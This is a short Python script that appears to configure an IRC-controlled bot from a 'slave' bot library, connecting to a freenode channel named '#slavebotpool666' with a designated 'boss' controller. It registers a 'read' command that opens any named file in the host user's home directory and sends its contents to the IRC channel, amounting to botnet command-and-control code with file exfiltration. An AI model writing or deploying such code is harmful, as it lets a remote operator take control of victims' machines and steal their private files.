from slave.lib.bots import BotBasic, BotV2
from pathlib import Path

config = {
    'host': 'chat.freenode.net',
    'port': 6667,
    'channel': "#slavebotpool666",
    'boss_name': 'boss666',
    'bot_prefix': "SLAVEBOT"
}
BotBasic.read_config_from_dict(config)
BotBasic.bot_type = "MyCustomBot"

@BotBasic.register('read', all=True, on_connect=False, help_text="Read from file $read [/all | <bot_id>] <file_name>")
def read_file(bot, args):
    path = str(Path(f"~/{args[1]}").expanduser())
    with open(path, 'r') as f:
        bot.send_text(f.read())
    
BotBasic.use_other_bot_commands(BotV2)
BotBasic.start()